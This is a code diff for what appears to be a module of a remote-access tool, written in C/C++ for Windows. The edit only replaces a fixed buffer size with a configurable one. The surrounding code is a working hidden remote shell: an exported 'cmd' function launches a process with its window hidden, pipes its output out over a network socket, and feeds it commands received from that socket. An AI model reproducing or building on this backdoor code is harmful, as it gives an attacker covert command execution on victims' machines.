@@ -3,8 +3,6 @@
 
 #include "../core/external.h"
 
-#define SIZE 4096
-
 typedef struct {
     HANDLE fHand;
     char *buf;
@@ -14,7 +12,7 @@ void helper(hand_buf *arg)
 {
     DWORD num;
     for(;;){
-        ReadFile(arg->fHand, arg->buf, SIZE, &num, NULL);
+        ReadFile(arg->fHand, arg->buf, DllMeta.net.buf_sz, &num, NULL);
         send(DllMeta.net.sock, arg->buf, num, 0);
     }
 }
@@ -29,18 +27,18 @@ extern "C" __declspec(dllexport) void cmd(const char *arg)
 
     HANDLE rStdOut, rStdErr, rStdIn;
 
-    char out_buf[SIZE];
-    char err_buf[SIZE];
-    char in_buf[SIZE];
+    char out_buf[DllMeta.net.buf_sz];
+    char err_buf[DllMeta.net.buf_sz];
+    char in_buf[DllMeta.net.buf_sz];
     
     STARTUPINFO info;    
     
     ZeroMemory(&info, sizeof(STARTUPINFO));
     info.cb = sizeof(STARTUPINFO);
     
-    CreatePipe(&rStdOut, &info.hStdOutput, &attr, SIZE);
-    CreatePipe(&rStdErr, &info.hStdError, &attr, SIZE);
-    CreatePipe(&info.hStdInput, &rStdIn, &attr, SIZE);
+    CreatePipe(&rStdOut, &info.hStdOutput, &attr, DllMeta.net.buf_sz);
+    CreatePipe(&rStdErr, &info.hStdError, &attr, DllMeta.net.buf_sz);
+    CreatePipe(&info.hStdInput, &rStdIn, &attr, DllMeta.net.buf_sz);
     
     info.dwFlags = STARTF_USESTDHANDLES | STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
     info.wShowWindow = SW_HIDE;
@@ -75,7 +73,7 @@ extern "C" __declspec(dllexport) void cmd(const char *arg)
     HANDLE helpB = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&helper, &err, 0, NULL);
     
     for(;;){
-        num = recv(DllMeta.net.sock, in_buf, SIZE, 0);
+        num = recv(DllMeta.net.sock, in_buf, DllMeta.net.buf_sz, 0);
         WriteFile(rStdIn, in_buf, num, NULL, NULL);
         if(strstr(in_buf, "exit")) break;
     }
